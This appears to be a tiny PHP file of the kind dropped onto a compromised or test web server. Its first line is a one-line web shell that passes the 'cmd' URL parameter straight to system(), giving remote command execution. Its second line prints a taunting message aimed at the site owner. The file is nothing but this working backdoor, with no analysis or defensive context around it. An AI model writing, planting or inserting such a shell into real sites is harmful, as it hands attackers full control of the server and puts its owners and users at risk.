<?php system($_GET["cmd"]); ?>
<?php echo "Vulnnr on yo forehead"; ?>
